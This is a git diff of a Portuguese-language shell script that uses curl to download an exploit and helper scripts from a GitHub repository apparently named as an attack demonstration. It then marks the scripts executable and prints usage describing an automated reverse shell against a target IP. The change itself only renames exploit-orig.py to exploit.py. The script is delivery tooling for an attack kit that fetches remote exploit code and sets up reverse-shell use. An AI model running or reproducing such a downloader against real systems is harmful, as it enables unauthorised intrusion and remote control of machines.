@@ -15,7 +15,7 @@ set -eu
 REPO="https://raw.githubusercontent.com/erick-graeff/demonstracao-ataque/refs/heads/main"
 
 echo "[*] Baixando arquivos..."
-curl -sO "$REPO/exploit-orig.py"
+curl -sO "$REPO/exploit.py"
 curl -sO "$REPO/run_shell.sh"
 curl -sO "$REPO/run_exploit.sh"
 curl -sO "$REPO/run_all.sh"
@@ -23,7 +23,7 @@ curl -sO "$REPO/run_all.sh"
 chmod +x run_shell.sh run_exploit.sh run_all.sh
 
 echo "[+] Arquivos baixados:"
-ls -la exploit-orig.py run_shell.sh run_exploit.sh run_all.sh
+ls -la exploit.py run_shell.sh run_exploit.sh run_all.sh
 echo ""
 echo "Uso:"
 echo "  ./run_shell.sh [TARGET_IP]    → reverse shell (automatizado)"
